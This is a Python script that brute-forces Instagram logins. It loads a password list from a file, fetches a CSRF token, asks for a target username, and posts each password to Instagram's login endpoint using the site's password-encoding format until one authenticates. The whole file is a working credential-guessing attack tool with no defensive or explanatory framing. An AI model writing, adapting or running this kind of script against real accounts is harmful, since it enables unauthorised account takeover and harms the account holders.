import requests
import json
import time
import os

# Define the file path (update this path to match your setup)
current_directory = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(current_directory, "pass.txt")

# Read all the passwords from the file into a list
with open(file_path, "r") as file:
    passwords = [line.strip() for line in file if line.strip()]  # Remove any empty lines

# Instagram login URL
LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'

# Define headers for the request (these are necessary for the request to work)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'X-CSRFToken': '',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://www.instagram.com/',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# A session object to maintain cookies and session state
session = requests.Session()

# Get CSRF token
session.get('https://www.instagram.com/')  # This is necessary to get the CSRF token
csrf_token = session.cookies['csrftoken']
headers['X-CSRFToken'] = csrf_token

# Username to be used (hardcoded or obtained from elsewhere)
username = input("Enter the username:  ")  # You can set this as per your use case

# Try each password one by one until login is successful
for password in passwords:
    try:
        print(f"Trying password: {password}")

        # Define the login payload
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',  # Emulates Instagram's password encryption method
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        # Perform the login request
        response = session.post(LOGIN_URL, data=payload, headers=headers)
        login_response = json.loads(response.text)

        # Check the response
        if login_response.get('authenticated'):
            print("Login successful!")
            break
        else:
            print(f"Login failed with password: {password}. Trying next password...")

    except Exception as e:
        print(f"An error occurred: {e}")
        print("Skipping to the next password...")

        time.sleep(5)

else:
    print("All passwords failed.")
